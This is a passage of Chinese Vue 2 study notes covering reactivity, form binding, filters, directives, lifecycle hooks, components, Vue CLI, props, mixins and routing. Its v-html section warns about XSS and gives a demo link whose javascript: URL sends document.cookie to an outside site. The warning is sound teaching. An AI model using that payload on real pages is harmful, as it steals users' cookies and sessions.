   通过setter实现监视，且要在new Vue的时候就传入要监测的数据

   - 对象中后追加的属性，Vue默认不做响应式处理

   - 如需给后添加的属性做响应式，使用如下API：

     `Vue.set(target,propertyName/index,value)`或

     `vm.$set(target,propertyName/index,value)`

3. 如何监测数组中的数据

   通过包裹数组更新元素的方法实现，本质就是做了两件事

   - 调用原生对应的方法对数组进行更新
   - 重新解析模板，进而更新页面

4. 在Vue中修改数组中国的某个元素一定要使用如下方法：

   `push()  pop()  shift()  unshift()  splice()  sort()  reverse()`

   `Vue.set()  vm.$set()`

   





## 收集表单数据

- 若`<input type="text"/>`,则v-model收集的是value值，用户输入的就是value值
- 若`<input type="radio"/>`，则v-model收集的就是value值，且要给标签配置value值
- 若`<input type="checkbox"/>` 
  - 没有配置input的value属性，那么收集的就是checked(勾选or未勾选，bool值)
  - 若配置了input的value属性：
    - v-model的初始值为非数组，那么收集的是checked
    - v-model的初始值为数组，那么收集的就是value组成的数组
- 备注：v-model三大修饰符：
  - lazy:失去焦点时再收集数据
  - number：输入字符串转为有效的数字
  - itrm：输入首尾空格过滤

```html
<div id ="app">    <form @submit.prevent="demo" action="">        账号：<input type="text" v-model.trim="userInfo.account"> <br/> <br/>        密码：<input type="password" v-model="userInfo.password"> <br>        年龄：<input type="number" v-model.number="userInfo.age"><br>        性别：        男<input type="radio" name="sex" value="male" v-model="userInfo.sex">         女<input type="radio" name="sex" value="female" v-model="userInfo.sex"> <br>        爱好:        学习<input type="checkbox" value="study" v-model="userInfo.hobby">         打游戏<input type="checkbox" value="game" v-model="userInfo.hobby">         吃饭<input type="checkbox" value="eat" v-model="userInfo.hobby"> <br>        所属校区:        <select v-model="userInfo.city">            <option value="">请选择校区</option>            <option value="harbin">哈尔滨</option>            <option value="weihai">威海</option>            <option value="shenzhen">深圳</option>        </select>        <br>        其他信息：        <textarea v-model.lazy="userInfo.others"></textarea> <br>        <input type="checkbox" v-model="userInfo.agree"/><a href="http://www.cezzz.top">《用户信息》</a>        <button>提交</button>    </form></div><script>    var vm = new Vue({        el: '#app',        data: {            userInfo:{                account:'',                password:'',                age:18,                sex:'female',                hobby:[],                city:'weihai',                others:'无',                agree:''            }        },        methods: {            demo(){                console.log(JSON.stringify(this.userInfo));            }        }    });</script>
```





## 过滤器

- 定义：对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)
- 语法：
  - 注册处理器:`Vue.filter(name,callback)`或`new Vue{filters:{}}`
- 备注
  - 过滤器也可以接收额外参数，多个过滤器也可以串联
  - 并没有改变原本的数据，是产生新的对应的数据
- 用法：
  - 过滤器可以作用在差值语法和v-bind

```html
<div id ="app">    <h2>显示格式化后的时间</h2>    <!-- 计算属性实现 -->    <h3>现在是:{{fmtTime}}</h3>    <!-- methods实现 -->    <h3>现在是:{{getFmtTime()}}</h3>    <!-- 过滤器实现 -->    <h3>现在是:{{time | timeFormater('YYYY_MM_DD') | mySlice }}</h3>    <!-- 过滤器可以作用在v-bind上 -->    <h3 :x="msg | mySlice"></h3>    <!-- 过滤器不可作用在v-model上 -->    <input type="text" v-model="msg | mySlice"/></div><div id="app2">    <h3>现在是:{{time | mySlice }}</h3></div><script>    //注册全局过滤器    Vue.filter('mySlice',function(value){        return value.slice(0,4)    })    var vm = new Vue({        el: '#app',        data: {            time:1626589191242,            msg:'hello,cez'        },        computed: {            fmtTime(){                return dayjs(this.time).format('YYYY年MM月DD HH:mm:ss')            }        },        methods:{            getFmtTime(){                return dayjs(this.time).format('YYYY年MM月DD HH:mm:ss')            }        },        filters:{            timeFormater(val,formatStr='YYYY年MM月DD HH:mm:ss'){                return dayjs(val).format(formatStr)            }        }    });    var vm2 = new Vue({        el:'#app2',        data:{            time:1626589191242        }    })</script>
```





## v-text指令

- 向其所在的节点中渲染文本内容
- 与插值语法的区别：v-text会替换掉节点中的内容,{{xx}}则不会

![image-20210718145110347](Vue.assets/20210718145111.png)



```html
<div id ="app">    <h2 v-text="name"></h2></div><script>    var vm = new Vue({        el: '#app',        data: {            name:'cez'        },        methods: {        },    });</script>
```

> v-text会替换开闭标签之间的内容，所以推荐使用插值语法，更加灵活。







## v-html指令

- 作用：向指定结点中渲染包含html结构的内容
- 与插值语法的区别：
  - v-html会替换掉节点中所有的内容，{{xx}}则不会
  - v-html可以识别html结构
- 严重注意：v-html有安全性问题
  - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
  - 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上



- cookie

  ![image-20210718152450091](Vue.assets/20210718152600.png)

  ![image-20210718152622962](Vue.assets/20210718152624.png)

  ![image-20210718152750766](Vue.assets/20210718152752.png)

```html
<div id ="app">
    <h2 v-html="str"></h2>
    <h2 v-html="str2"></h2>
</div>

<script>
    var vm = new Vue({
        el: '#app',
        data: {
            str:'<h3>Hello,Cez</h3>',
            str2:'<a href=javascript:location.href="http://www.cezzz.top?"+document.cookie>找到你要的资源了，快点击!!!</a>'
        },
        methods: {

        },
    });
</script>
```







## v-cloak指令

- v-cloak指令(没有值)：
  - 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
  - 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题，当Vue接管时会自动删除v-cloak

```html
<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Document</title>    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>    <style>        /* 选中所有标签中含v-cloak属性的元素 */        [v-cloak]{            display:none;        }    </style></head><body>    <div id ="app">        <h2 v-cloak>{{name}}</h2>    </div>    <script>        var vm = new Vue({            el: '#app',            data: {                name:'cez'            },            methods: {                        },        });    </script></body></html>
```



## v-once指令

- v-once所在节点在初次动态渲染后，就视为静态内容了
- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

```html
<div id ="app">    <h2 v-once>初始化的n值为:{{n}}</h2>    <h2>当前的n值为:{{n}}</h2>    <button @click="n++">点我n+1</button></div><script>    var vm = new Vue({        el: '#app',        data: {            n:1        },    });</script>
```





## v-pre指令

- 跳过其所在节点的编译过程
- 可以利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<div id ="app">    <h2 v-pre>Learn Vue!</h2>    <h2>当前的n值为:{{n}}</h2>    <button @click="n++">点我n+1</button></div><script>    var vm = new Vue({        el: '#app',        data: {            n:1        },    });</script>
```







## 自定义指令

---暂略---









## 引出生命周期

- 生命周期
  - 又名：生命周期回调函数、生命周期函数、生命周期钩子
  - 是什么：Vue在关键时刻帮我们调用的一些特殊函数的名称
  - 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
  - 生命周期函数中的this指向是vm或组件实例对象

```html
<div id ="app">
    <!-- 简写opacity:opacity 同名 -->
    <h2 :style="{opacity}">欢迎学习Vue</h2>
</div>

<script>
    var vm = new Vue({
        el: '#app',
        data: {
            opacity:1
        },
        //Vue完成模板的解析,并把初始的真实DOM元素放入页面后(挂载完毕)调用mounted
        mounted() {
            console.log('mounted',this);
            setInterval(()=>{
                this.opacity-=0.01
                if (this.opacity<=0) 
                    this.opacity = 1
            },16)
        },
    });

    // 通过外部的定时器实现(不推荐)
    // setInterval(()=>{
    //     vm.opacity -= 0.01
    //     if (vm.opacity<=0) 
    //         vm.opacity=1;
    // },16);
</script>
```





## 生命周期挂载流程

- Vue完整生命周期：

![](Vue.assets/lifecycle.png)





![image-20210718173317473](Vue.assets/20210718173319.png)

![image-20210718173459988](Vue.assets/20210718173501.png)









![image-20210718173511963](Vue.assets/20210718173513.png)

- vm.$el可以用于比较算法，便于复用等

![image-20210718173555864](Vue.assets/20210718173557.png)







## 更新流程

![image-20210718180347373](Vue.assets/20210718180348.png)





## 销毁流程

![image-20210718180703191](Vue.assets/image-20210718180703191.png)

- `vm.$destroy()	`

  - **用法**：

    完全销毁一个实例。清理它与其它实例的连接，解绑它的全部指令及事件监听器。

    触发 `beforeDestroy` 和 `destroyed` 的钩子。

  > 在大多数场景中你不应该调用这个方法。最好使用 `v-if` 和 `v-for` 指令以数据驱动的方式控制子组件的生命周期。







```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id ="app">
        <h2>{{n}}</h2>
        <h2>当前的n值为:{{n}}</h2>
        <button @click="n++">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>

    <script>
        var vm = new Vue({
            el: '#app',
            data: {
                n:1
            },
            methods: {
                bye(){
                    console.log('byebye');
                    this.$destroy();
                },
                add(){
                    this.n++;
                }
            },
            beforeCreate() {
                console.log('beforeCreate')
                console.log(this)
                debugger;    
            },
            created() {
                console.log('created')
                console.log(this)
                debugger;
            },
            beforeMount() {
                console.log('beforeMount')
                console.log(this)
                document.querySelector('h2').innerText='beforeMount';   
                debugger;
            },
            mounted() {
                console.log('mounted')
                console.log(this)
                debugger;
            },
            beforeUpdate() {
                console.log('beforeUpdate')
                console.log(this.n)
                debugger;
            },
            updated() {
                console.log('updated')
                console.log(this.n)
                debugger;
            },
            beforeDestroy() {
                console.log('beforeDestroy')
                console.log(this.n)

                //虽然this.n+1了，但是因为已经进入了destroy的流程了，所以不会更新View
                this.add();
                debugger;
            },  
            destroyed() {
                console.log('destroy')
            },
        });
    </script>
</body>

</html>
```



## 生命周期总结

- beforeCreate和created指的是数据监测和数据代理的create，而不是vm对象

```html
<div id ="app">
    <!-- 简写opacity:opacity 同名 -->
    <h2 :style="{opacity}">欢迎学习Vue</h2>
    <button @click="stop">点我停止变换</button>
</div>

<script>
    var vm = new Vue({
        el: '#app',
        data: {
            opacity:1
        },
        methods:{
            stop(){
                this.$destroy();
            }
        },
        mounted() {
            console.log('mounted',this);
            //返回值相当于这个计时器的id
            this.timer = setInterval(()=>{
                this.opacity-=0.01
                if (this.opacity<=0) 
                    this.opacity = 1
            },16)
        },
        beforeDestroy() {
            console.log('vm要寄咯!');
            clearInterval(this.timer);
        },
    });
</script>
```

![image-20210719004520140](Vue.assets/20210719004521.png)

# Vue组件化编程

## 对组件的理解

- 传统方式

  ![image-20210719005643259](Vue.assets/20210719005644.png)





- 组件方式

  ![image-20210719005858994](Vue.assets/20210719005901.png)



![image-20210719005919536](Vue.assets/20210719005921.png)



- 组件的定义：实现应用中**局部**功能**代码**和**资源**的**集合**



- 模块
  - 理解：向外提供特定功能的js程序，一般就是一个js文件
  - 为什么：js文件很多很复杂
  - 作用：复用js，简化js的编写，提高js运行效率



- 模块化：当应用中的js都以模块来编写，那么这个应用就是一个模块化的应用
- 组件化：当应用中的功能都是多组件的方式编写，那这个应用就是一个组件化的应用





## 非单文件组件

非单文件组件

- 一个文件中包含多个组件

单文件组件

- 一个文件中只包含一个组件 `xxx.vue`



![image-20210719013209747](Vue.assets/20210719013211.png)

```html
<div id ="app">
    <!-- 第三步  编写组件标签 -->
    <school></school>
    <hr/>
    <!-- 第三步  编写组件标签 -->
    <student></student>    
    <hr/>
    <student></student>    
    <hr/>
    <hello></hello>
</div>

<div id="app2">
    <hello></hello>
</div>

<script>
    //第一步  创建school组件
    const school = Vue.extend({
        template:`
<div>
<h2>学校名称:{{schoolName}}</h2>
<h2>学校地址:{{address}}</h2>
<button @click="showName">点我提示学校名</button>
<div>
`,
        methods:{
            showName(){
                alert(this.schoolName);
            }
        },

        //el:"#app" //报错 组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务哪个容器
        data(){
            return {
                schoolName:'hitwh',
                address:"weihai",
            }
        }
    })

    //第一步  创建school组件
    const student = Vue.extend({
        template:`
<div>
<h2>学生姓名:{{studentName}}</h2>
<h2>学生年龄:{{age}}</h2>
    </div>
`,
        data(){
            return {
                studentName:'cez',
                age:20,
            }
        }
    })

    const hello = Vue.extend({
        template:`
<div>
<h2>Hello,{{name}}</h2>
    </div>
`,
        data(){
            return {
                name:'Tom'
            }
        }
    })

    //全局注册组件，所有vm都可以使用
    Vue.component('hello',hello);

    new Vue({
        el: '#app',
        components:{
            //第二步 注册组件(局部注册)
            // school:school,
            school,student
            // student:student
        },
    });

    new Vue({
        el:'#app2'
    })
</script>
```



## 组件的几个注意点

![image-20210719085116926](Vue.assets/20210719085118.png)





## 嵌套组件

```html
<div id ="root">
</div>

<script>
    const student = Vue.extend({
        template:`
<div>
<h2>学生姓名:{{studentName}}</h2>
<h2>学生年龄:{{age}}</h2>
    </div>
`,
        data(){
            return {
                studentName:'cez',
                age:20,
            }
        }
    })

    const school = Vue.extend({
        name:'school',
        template:`
            <div>
            <h2>学校名称:{{schoolName}}</h2>
            <h2>学校地址:{{address}}</h2>
            <button @click="showName">点我提示学校名</button>
            <hr/>
            <student></student>
                </div>
`,
        methods:{
            showName(){
                alert(this.schoolName);
            }
        },
        data(){ 
            return {
                schoolName:'hitwh',
                address:"weihai",
            }
        },
        components:{
            student
        }  
    })

    const hello = Vue.extend({
        template:`
<div>
<h2>Hello,{{name}}</h2>
    </div>
`,
        data(){
            return {
                name:'Tom'
            }
        }
    })

    const app = Vue.extend({
        name:'app',
        template:`
<div>
<school></school>
<hello></hello>
    </div>
`,

        components:{
            school,
            hello
        }
    })

    new Vue({
        template:'<app></app>',
        el:"#root",
        components:{
            app
        }
    })
```





## 单文件组件

```html
<template>
  <!-- 组件的结构 -->
    <div>
        <h2>学校名称:{{schoolName}}</h2>
        <h2>学校地址:{{address}}</h2>
        <button @click="showName">点我提示学校名</button>
    </div>
</template>

<script>
    //组件交互相关的代码(数据、方法等)
    export default {
        name:'School',
        methods:{
            showName(){
                alert(this.schoolName);
            }
        },
        data(){ 
            return {
                schoolName:'hitwh',
                address:"weihai",
            }
        }
    }
</script>

<style scoped>
  
</style>
```





# 使用Vue脚手架



## 创建Vue脚手架

Vue CLI

- 全局安装@vue/cli

  `npm install -g @vue/cli`

- 切换要创建项目的目录，然后使用命令创建项目

  `vue create xxx`

- 启动项目

  `npm run serve`



> 配置npm淘宝镜像：`npm config set registry https://registry.npm.taobao.org`







## render函数

![image-20210719110640745](Vue.assets/image-20210719110640745.png)





## 修改默认配置

把默认配置信息放到output.js中查看：

	`vue inspect > output.js`

参考<a href="https://cli.vuejs.org/zh/config/">vue-cli官方文档</a>



语法检查：

![image-20210719113153419](Vue.assets/20210719113154.png)





## ref属性

![image-20210719151023888](Vue.assets/20210719151025.png)

```vue
<template>
    <div>
      <h1 v-text="msg" ref="title"></h1>
      <button @click="showDom" ref="btn">点我输出上方的DOM元素</button>
      <School ref="sch"></School>
    </div>
</template>

<script>

import School from './components/School.vue'

export default {
    name:'App',
    components:{
      School  
    },
    data() {
      return {
          msg:'Learn Vue'
      }
    },
    methods:{
      showDom(){
        console.log(this.$refs)
        console.log(this.$refs.title)
        console.log(this.$refs.btn)
        console.log(this.$refs.sch)
      }
    }
}
</script>

<style scoped>
  
</style>
```



## props配置

![image-20210719154640462](Vue.assets/20210719154641.png)





```vue
<template>
    <div>
        <h1>{{msg}}</h1>
        <h2>学生姓名:{{myName}}</h2>
        <h2>学生年龄:{{age}}</h2>
        <h2>学生性别:{{myAge+1}}</h2>
        <button @click="changeAge">尝试修改传来的年龄</button>
    </div>
</template>

<script>

export default {
    name:'Student',
    data() {
      return {
          msg:"hello,world",
          myName:this.name,
          myAge:this.age,
      }
    },
    methods:{
      changeAge(){
        this.myAge++;
      }
    },
    //props中的prop相较于data是优先接收的
    // 简单接收
    // props:['name','sex','age']

    //接收的同时对数据类型限制
    // props: {
    //   name: String,
    //   age: Number,
    //   sex: String
    // }


    //接收的同时对数据进行类型限制+默认值的指定+必要性的限制
    props:{
      name:{
        type:String, //name的类型:String
        required: true //name是必要的
      },
      age:{
        type:Number,
        default:99     //默认值
      },
      sex:{
        type:String,
        required:true
      }
    }

}
</script>

```

```vue
<div>
    <Student name="cez" sex="男" :age="20"/>
    <hr/>
    <Student name="lxy" sex="女" :age="20"/>
    <hr/>
</div>
```







## mixin混入

![image-20210719161204954](Vue.assets/20210719161206.png)



- mixin.js

  ```javascript
  export const mixin = {
      methods:{
          showName(){
              alert(this.name);
          }
      }
  }
  
  export const mixin2 = {
      data(){
          return {
              x:100,
              y:200
          }
      }
  }
  ```

- 局部混入:

  ```javascript
  //引入混合
  import {mixin,mixin2} from '../mixin'
  export default {
      name:'Student',
      data() {
        return {
            name:'cez',
            sex:'男'
        }
      },
      mixins:[mixin,mixin2]
  
  }
  ```

- 全局混入:（main.js)

  ```javascript
  // 引入Vue
  import Vue from 'vue'
  // 引入App
  import App from './App.vue'
  import {mixin,mixin2} from "@/mixin";
  // 关闭Vue的生产提示
  Vue.config.productionTip = false
  
  Vue.mixin(mixin)
  Vue.mixin(mixin2)
  
  // 创建vm
  new Vue({
      el:"#app",
      render:h=>h(App)
  })
  ```





## 插件

![image-20210719163437235](Vue.assets/20210719163438.png)



- plugins.js   

```javascript
export default {
    install(){
        console.log('install')
    }
}
```





## scoped样式

- 作用：让样式在局部生效，防止冲突
- 写法：`<style scoped>`









## 路由简介

![image-20210719165729769](Vue.assets/20210719165731.png)



SPA应用(单页面应用)

![image-20210719170143304](Vue.assets/20210719170145.png)





![image-20210719170850609](Vue.assets/20210719170852.png)





- vue-router是vue的一个插件库，专门用来实现SPA应用
- 对SPA应用的理解：
  - 单页web应用(single page web application,SPA)
  - 整个应用只有一个完整的页面
  - 点击页面中的导航链接不会刷新页面，只会做页面的局部更新
  - 数据需要通过ajax请求获取





- 什么是路由？
  - 一个路由就是一组映射关系(key value)
  - key为路径 value可能是function或component



- 路由分类
  - 前端路由
    - 理解：value是component，用于展示页面内容
    - 工作过程：当浏览器的路径改变时，对应的组件就会显示
  - 后端路由
    - 理解：value是function，用于处理客户端提交的请求
    - 工作过程：服务器收到一个请求时， 根据**请求路径**找到**匹配的函数**来处理请求，返回相应数据





## 基本路由

![image-20210719202807376](Vue.assets/20210719202808.png)

![image-20210719202816796](Vue.assets/20210719202817.png)





## 嵌套路由(多级路由)

![image-20210719211816263](Vue.assets/20210719211817.png)





## 路由传参

![image-20210719213303628](Vue.assets/20210719213304.png)





## 命名路由

![image-20210719213906028](Vue.assets/20210719213907.png)

![image-20210719213918730](Vue.assets/20210719213919.png)